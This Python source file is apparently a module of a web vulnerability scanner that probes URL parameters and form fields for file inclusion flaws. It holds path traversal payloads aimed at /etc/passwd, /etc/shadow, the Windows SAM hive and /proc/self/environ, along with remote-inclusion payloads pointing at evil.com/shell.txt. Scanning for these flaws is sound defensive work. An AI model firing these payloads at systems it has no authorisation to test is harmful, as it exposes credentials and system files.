"""Path Traversal (LFI/RFI) Scanner Module"""

import re
import requests
from typing import List, Dict, Any, Optional


class PathTraversalScanner:
    """Local/Remote File Inclusion vulnerability scanner"""
    
    def __init__(self, timeout: int = 10, user_agent: str = None):
        self.timeout = timeout
        self.user_agent = user_agent or "WebCross-Scanner/1.0"
        
        # LFI payloads with expected content
        self.lfi_payloads = [
            # Unix
            ("../../../etc/passwd", ["root:", "nobody:", "/bin/bash", "/bin/sh"]),
            ("....//....//....//etc/passwd", ["root:", "nobody:"]),
            ("..%2f..%2f..%2fetc/passwd", ["root:", "nobody:"]),
            ("..%252f..%252f..%252fetc/passwd", ["root:", "nobody:"]),
            ("....\/....\/....\/etc/passwd", ["root:", "nobody:"]),
            ("/etc/passwd", ["root:", "nobody:"]),
            ("file:///etc/passwd", ["root:", "nobody:"]),
            
            # Windows
            ("..\\..\\..\\windows\\win.ini", ["[fonts]", "[extensions]"]),
            ("....\\\\....\\\\....\\\\windows\\win.ini", ["[fonts]"]),
            ("..%5c..%5c..%5cwindows\\win.ini", ["[fonts]"]),
            ("C:\\Windows\\win.ini", ["[fonts]"]),
            
            # Null byte (older PHP)
            ("../../../etc/passwd%00", ["root:"]),
            ("../../../etc/passwd%00.jpg", ["root:"]),
            
            # Wrapper bypasses
            ("php://filter/convert.base64-encode/resource=../../../etc/passwd", []),
            ("php://filter/read=string.rot13/resource=../../../etc/passwd", []),
        ]
        
        # RFI payloads (check for external request capability)
        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "//evil.com/shell.txt",
            "ftp://evil.com/shell.txt",
        ]
        
        # Common LFI target files
        self.sensitive_files = {
            "unix": [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/var/log/apache2/access.log",
                "/var/log/apache/access.log",
                "/var/log/nginx/access.log",
            ],
            "windows": [
                "C:\\Windows\\win.ini",
                "C:\\Windows\\system32\\config\\SAM",
                "C:\\Windows\\system32\\drivers\\etc\\hosts",
            ]
        }
        
        # Common file markers
        self.file_markers = {
            "/etc/passwd": ["root:", "daemon:", "nobody:"],
            "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
            "/etc/hosts": ["127.0.0.1", "localhost"],
            "/proc/self/environ": ["PATH=", "HOME=", "USER="],
        }
    
    def _make_request(self, url: str, method: str = "GET",
                      data: Dict = None, params: Dict = None) -> Optional[requests.Response]:
        try:
            headers = {"User-Agent": self.user_agent}
            if method.upper() == "GET":
                return requests.get(url, params=params, headers=headers,
                                  timeout=self.timeout, verify=False)
            else:
                return requests.post(url, data=data, headers=headers,
                                   timeout=self.timeout, verify=False)
        except Exception:
            return None
    
    def _check_file_content(self, response: requests.Response, 
                           payload: str, markers: List[str]) -> Optional[Dict]:
        """Check if file content is present in response"""
        if not response:
            return None
        
        content = response.text
        
        for marker in markers:
            if marker in content:
                return {
                    "type": "PATH_TRAVERSAL_LFI",
                    "payload": payload,
                    "evidence": f"File content detected: {marker}",
                    "confidence": "HIGH"
                }
        
        # Check for base64 encoded content (php://filter)
        if "php://filter" in payload and len(content) > 100:
            import base64
            try:
                # Try to decode and check for file markers
                decoded = base64.b64decode(content[:1000]).decode('utf-8', errors='ignore')
                for file_key, file_markers in self.file_markers.items():
                    for marker in file_markers:
                        if marker in decoded:
                            return {
                                "type": "PATH_TRAVERSAL_LFI",
                                "payload": payload,
                                "evidence": f"Base64 encoded file content: {marker}",
                                "confidence": "HIGH"
                            }
            except Exception:
                pass
        
        return None
    
    def _check_path_error(self, response: requests.Response, payload: str) -> Optional[Dict]:
        """Check for path-related error messages"""
        if not response:
            return None
        
        error_patterns = [
            r"failed to open stream",
            r"No such file or directory",
            r"include\(\)",
            r"require\(\)",
            r"file_get_contents\(\)",
            r"fopen\(\)",
            r"Warning: include",
            r"Warning: require",
            r"failed opening",
            r"for inclusion",
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return {
                    "type": "PATH_TRAVERSAL_ERROR",
                    "payload": payload,
                    "evidence": f"File inclusion error detected",
                    "confidence": "MEDIUM"
                }
        
        return None
    
    def scan_url(self, url: str) -> List[Dict[str, Any]]:
        """Scan URL for path traversal vulnerabilities"""
        findings = []
        from urllib.parse import urlparse, parse_qs, urlencode
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return findings
        
        # Look for file-related parameters
        file_params = []
        for param in params:
            param_lower = param.lower()
            if any(kw in param_lower for kw in ['file', 'path', 'page', 'include', 
                                                  'doc', 'folder', 'dir', 'template',
                                                  'load', 'read', 'content', 'module']):
                file_params.append(param)
        
        # Test both identified file params and all params
        test_params = file_params if file_params else list(params.keys())
        
        for param in test_params:
            for payload, markers in self.lfi_payloads[:10]:
                test_params_dict = params.copy()
                test_params_dict[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict, doseq=True)}"
                
                response = self._make_request(test_url)
                
                # Check file content
                result = self._check_file_content(response, payload, markers)
                if result:
                    result["parameter"] = param
                    result["url"] = url
                    findings.append(result)
                    break
                
                # Check errors
                result = self._check_path_error(response, payload)
                if result:
                    result["parameter"] = param
                    result["url"] = url
                    findings.append(result)
        
        return findings
    
    def scan_form(self, url: str, form: Dict) -> List[Dict[str, Any]]:
        """Scan form for path traversal"""
        findings = []
        action = form.get('action', url)
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', {})
        
        for field in inputs:
            for payload, markers in self.lfi_payloads[:5]:
                test_data = inputs.copy()
                test_data[field] = payload
                
                if method == "GET":
                    response = self._make_request(action, params=test_data)
                else:
                    response = self._make_request(action, method="POST", data=test_data)
                
                result = self._check_file_content(response, payload, markers)
                if result:
                    result["parameter"] = field
                    result["url"] = action
                    result["method"] = method
                    findings.append(result)
                    break
        
        return findings
